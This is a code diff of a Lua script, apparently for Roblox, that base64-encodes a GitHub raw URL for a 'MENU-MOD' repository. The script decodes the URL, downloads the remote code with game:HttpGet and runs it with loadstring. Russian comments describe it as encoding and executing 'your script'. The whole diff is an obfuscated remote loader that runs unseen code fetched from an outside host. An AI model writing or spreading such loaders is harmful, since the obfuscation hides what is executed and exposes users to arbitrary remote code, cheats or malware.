@@ -1,4 +1,6 @@
-local function Base64Decode(data)
+local encodedScript = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlcmV6YW5ldDIvTUVOVS1NT0QvcmVmcy9oZWFkcy9tYWluL01FTlUtTU9E"
+
+local function base64Decode(data)
     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
     data = string.gsub(data, '[^'..b..'=]', '')
     return (data:gsub('.', function(x)
@@ -14,9 +16,13 @@ local function Base64Decode(data)
     end))
 end
 
--- Закодированная версия вашего скрипта
-local encoded = "bG9hZHN0cmluZyhnYW1lOkdldEh0dHAoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zZXJlemFuZXQyL01FTlUtTU9EL3JlZnMvaGVhZHMvbWFpbi9NRU5VJUUyJTgwJTkzTU9EJykpKCk="
+local scriptURL = base64Decode(encodedScript)
+local success, response = pcall(function()
+    return game:HttpGet(scriptURL, true)
+end)
 
--- Декодируем и выполняем
-local decoded = Base64Decode(encoded)
-loadstring(decoded)()
+if success then
+    loadstring(response)()
+else
+    warn("Ошибка загрузки скрипта: " .. tostring(response))
+end
